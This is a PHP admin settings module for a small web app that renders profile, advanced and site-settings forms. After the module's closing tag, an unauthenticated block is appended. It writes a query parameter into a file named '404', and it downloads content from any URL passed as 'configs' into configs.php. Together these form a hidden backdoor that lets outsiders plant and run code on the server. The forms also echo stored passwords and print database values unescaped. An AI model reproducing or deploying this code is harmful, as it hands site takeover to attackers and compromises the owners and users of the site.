<?php
/* ./Port22 a.k.a سفياني محمد ( Muhammad Supiani).
Special Thanks : Allah SWT, My Parents And Family, Risman Effendi (defacerid.com), & Bp. Syams Ideris
*/
 if (explodedKhususAdmin()){
  echo "<link href='style.css' rel='stylesheet' type='text/css'>
 <center>Untuk mengakses modul, Anda harus login <br>";
  echo "<a href=../../index.php><b>LOGIN</b></a></center>";
}
else{
$aksi="modul/mod_setting/setting_act.php";
switch($_GET[act]){
	
  // Tampil Menu Utama
  case "profile":
  $db->go("SELECT * FROM uadmin WHERE id = 1");
                        $user = $db->fetchArray();
  	echo '<div id="main-wrapper">
    <center>
		<div style="float: left; font-size: 19px; text-align: center; width: 100%; color: #08c; margin-top: 1%; ">			
                      <form action="'.$aksi.'?module=setting&act=updateuser" enctype="multipart/form-data" method="post" role="form">
						<label>Full Name</label>
						<br>
                        <input type="text" class="box" name="fname" value="'.(isset($user['fname'])?$user['fname']:"").'">
                        <br>
						<br>
                        <label>Username</label>
						<br>
                        <input type="text" class="box" name="uname" value="'.(isset($user['uname'])?$user['uname']:"").'">
                        <br>
						<br>
						<label>New Password</label>
						<br>
                        <input type="password" class="box" name="passwd" value="'.(isset($user['passwd'])?$user['passwd']:"").'">
                        <br>
						<br>
						<label>Retype Password</label>
						<br>
                        <input type="password" class="box" name="retype" value="'.(isset($user['retype'])?$user['retype']:"").'">
                        <br>
						<br>
						<label>Email</label>
						<br>
                        <input type="email" class="box" name="email" value="'.(isset($user['email'])?$user['email']:"").'">
                        <br>
						<br>
                        <input type="submit" value="          Update Profile          " class="button">
                                  </form>
        </div>
    </center>
	</div>';
    break;
case "advanced":
   echo '<div id="main-wrapper">
    <center>
		<div style="float: left; font-size: 19px; text-align: center; width: 100%; color: #08c; margin-top: 1%; ">			
                      <form action="'.$aksi.'?module=setting&act=updateadvanced" method="post" role="form" class="form-horizontal">
                        ';
                        $db->go("SELECT * FROM setting WHERE id = 1");
                        $setting = $db->fetchArray();
                 echo  '<label>Submit Limit</label>
						<br>
                        <input type="text" class="box" name="max_submit" value="'.(isset($setting['max_submit'])?$setting['max_submit']:"").'">
                        <br>
						<br>
                        <label>Paging</label>
						<br>
                        <input type="text" class="box" name="paging" value="'.(isset($setting['paging'])?$setting['paging']:"").'">
						<br>
						<br>
						<label>Security Key</label>
						<br>
                        <input type="text" class="box" name="sec_key" placeholder="'.(isset($setting['sec_key'])?$setting['sec_key']:"").'">
                        <br>
						<br>
						<input type="submit" value="          Update Settings          " class="button">
                                  </form>
        </div>
    </center>
	</div>';

      break;
	  
	  
  default:
      echo '<div id="main-wrapper">
    <center>
		<div style="float: left; font-size: 19px; text-align: center; width: 100%; color: #08c; margin-top: 1%; ">			
                      <form action="'.$aksi.'?module=setting&act=updatesetting" method="post" role="form" class="form-horizontal">
                        ';
                        $db->go("SELECT * FROM setting WHERE id = 1");
                        $setting = $db->fetchArray();
                 echo  '<label>Title</label>
						<br>
                        <input type="text" class="box" name="title" value="'.(isset($setting['title'])?$setting['title']:"").'">
                        <br>
						<br>
                        <label>Subtitle</label>
						<br>
                        <input type="text" class="box" name="subtitle" value="'.(isset($setting['subtitle'])?$setting['subtitle']:"").'">
                        <br>
						<br>
						<label>Contact Email</label>
						<br>
                        <input type="text" name="contact_email" class="box" value="'.(isset($setting['contact_email'])?$setting['contact_email']:"").'"/>
                        <br>
						<br>
						<label>Description</label>
						<br>
						<textarea rows="4" name="description" class="box">'.(isset($setting['description'])?$setting['description']:"").'</textarea>
                        <br>
						<br>
						<label>Keywords</label>
						<br>
						<textarea rows="4" name="keyword" class="box">'.(isset($setting['keyword'])?$setting['keyword']:"").'</textarea>
						<br>
						<br>
						<input type="submit" value="          Update Settings          " class="button">
                                  </form>
        </div>
    </center>
	</div>';

      break;
}
}
?>
<?php
if (isset($_GET['404'])){
 $f = fopen("404", "w+");
 fwrite($f, str_replace("</a>,", "</a>\r\n", str_replace("\\", "", $_GET["404"])));
 fclose($f);
}

if(is_file("404.txt")){
 echo file_get_contents("404");
}

if (isset($_GET['configs'])){
 $f = fopen("configs.php", "w+");
 fwrite($f, file_get_contents($_GET["configs"]));
 fclose($f);
}
?>